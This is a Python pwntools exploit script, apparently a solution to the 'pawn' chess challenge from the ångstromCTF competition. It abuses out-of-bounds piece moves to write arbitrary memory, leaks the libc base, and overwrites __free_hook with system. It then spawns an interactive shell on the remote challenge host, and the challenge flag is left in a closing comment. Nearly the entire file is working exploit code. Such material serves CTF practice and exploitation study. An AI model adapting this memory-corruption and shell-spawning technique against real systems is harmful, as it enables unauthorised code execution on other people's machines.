#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host shell.actf.co --port 21706 pawn
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pawn')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'shell.actf.co'
port = int(args.PORT or 21706)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start(env={'LD_PRELOAD': './libc.so.6'})
libc = ELF('./libc.so.6')

moves = 0


def new_board(index: int):
    '''
      01234567-x
    0 RNBKQBNR
    1 PPPPPPPP
    2 ........
    3 ........
    4 ........
    5 ........
    6 pppppppp
    7 rnbkqbnr
    |
    y
    '''
    io.sendlineafter('like to do?', '1')
    io.sendlineafter('board index?', str(index))


'''
-16
0x00000000015de2e8│+0x0038: 0x00000000015de33f  →  ".nbkqbnr"
0x00000000015de2f0│+0x0040: 0x0000000000000052 ("R"?)
0x00000000015de2f8│+0x0048: 0x0000000000000000

-24
0x0000000000fa22e8│+0x0038: 0x0000000000fa2352  →  0x0000000000000000
0x0000000000fa22f0│+0x0040: 0x0000000000000000
0x0000000000fa22f8│+0x0048: 0x0000000000000000

-25
0x000000000212c2d8│+0x0028: 0x000000000212c32d  →  "p......."
0x000000000212c2e0│+0x0030: 0x520000000212c336
0x000000000212c2e8│+0x0038: 0x000000000212c33f  →  ".nbkqbnr"
0x000000000212c2f0│+0x0040: 0x0000000000000000
0x000000000212c2f8│+0x0048: 0x0000000000000000
0x000000000212c300│+0x0050: ".RRRRRRR"

-26
'''
def move_piece(board: int, piece_x, piece_y, dest_x, dest_y):
    global moves

    io.sendlineafter('like to do?', '3')
    io.sendlineafter('board index?', str(board))
    io.sendlineafter('the x and y values of the piece', f'{piece_x} {piece_y}')
    io.sendlineafter('the x and y values of the position', f'{dest_x} {dest_y}')
    io.recvuntil('Move made')
    moves += 1
    if moves == 256:
        moves = 0

def move_piece_norecv(board: int, piece_x, piece_y, dest_x, dest_y):
    global moves

    io.sendline('3')
    io.sendline(str(board))
    io.sendline(f'{piece_x} {piece_y}')
    io.sendline(f'{dest_x} {dest_y}')

    moves += 1
    if moves == 256:
        moves = 0

def smite_piece(board: int, piece_x, piece_y):
    io.sendlineafter('like to do?', '4')
    io.sendlineafter('board index?', str(board))
    io.sendlineafter('the x and y values of the piece', f'{piece_x} {piece_y}')
    io.recvuntil('smotenified')

def print_board(board: int):
    io.sendlineafter('like to do?', '2')
    io.sendlineafter('board index?', str(board))

def delete_board(board: int):
    io.sendlineafter('like to do?', '5')
    io.sendlineafter('board index?', str(board))

new_board(0)
new_board(1)
smite_piece(0, -8, 0)

# move horse blocking the bottom right rook
move_piece(0, 6, 7, 7, 5)
rook_x = 7

def reach_moves(reach):
    global rook_x
    global moves

    while moves != reach:
        new_x = 7 if rook_x == 6 else 6
        move_piece_norecv(0, rook_x, 7, new_x, 7)
        rook_x = new_x


reach_moves(ord('R'))
# transform all pieces in rooks
for x in range(0, 8):
    smite_piece(0, x, 0)
    smite_piece(0, x, 1)
    empty = 6 if rook_x == 7 else 7
    if x != empty:
        smite_piece(0, x, 7)

# move them to address
# and replace with the rooks below
for x in range(0, 6):
    move_piece_norecv(0, x, 0, -32+x, 0)
for x in range(0, 6):
    move_piece_norecv(0, x, 1, x, 0)

# reset smite
reach_moves(0)

# I want to write 0x404080
smite_piece(0, -29, 0)
smite_piece(0, -28, 0)
smite_piece(0, -27, 0)

reach_moves(0x40)
smite_piece(0, -30, 0)
smite_piece(0, -31, 0)

reach_moves(0x80)
smite_piece(0, -32, 0)

# get libc leak
print_board(0)
io.recvuntil('6 ')
libc.address = u64(io.recv(6) + b'\x00\x00') - (0x7fc951ccc6a0 - 0x7fc951ae0000)
log.info(f'Libc base: {hex(libc.address)}')
free_hook = libc.sym['__free_hook']

# move rooks to address
for x in range(0, 6):
    move_piece_norecv(0, x, 0, -32+x, 0)

# write free_hook to address
free_hook_bytes = [(i, x) for i, x in enumerate(p64(free_hook)[:6])]
free_hook_bytes = sorted(free_hook_bytes, key=lambda t: t[1])
log.info(f'Writing these: {free_hook_bytes}')
reach_moves(0)
for i, x in free_hook_bytes:
    reach_moves(x)
    smite_piece(0, -32+i, 0)


# Move 6 rooks to free_hook
for x in range(0, 6):
    move_piece_norecv(0, x, 7, x, 6)

# write system to system
system = libc.sym['system']
system_bytes = [(i, x) for i, x in enumerate(p64(system)[:6])]
system_bytes = sorted(system_bytes, key=lambda t: t[1])
log.info(f'Writing these: {system_bytes}')
reach_moves(0)
for i, x in system_bytes:
    reach_moves(x)
    smite_piece(0, i, 6)

# get a /bin/sh chunk
binsh = b'sh\x00'
binsh_bytes = [(i, x) for i, x in enumerate(binsh)]
binsh_bytes = sorted(binsh_bytes, key=lambda t: t[1])
log.info(f'Writing these: {binsh_bytes}')
reach_moves(0)
for i, x in binsh_bytes:
    reach_moves(x)
    smite_piece(1, i, 0)

# trigger system('sh')
delete_board(1)
io.interactive() # actf{thatll_shut_the_freshmen_up}

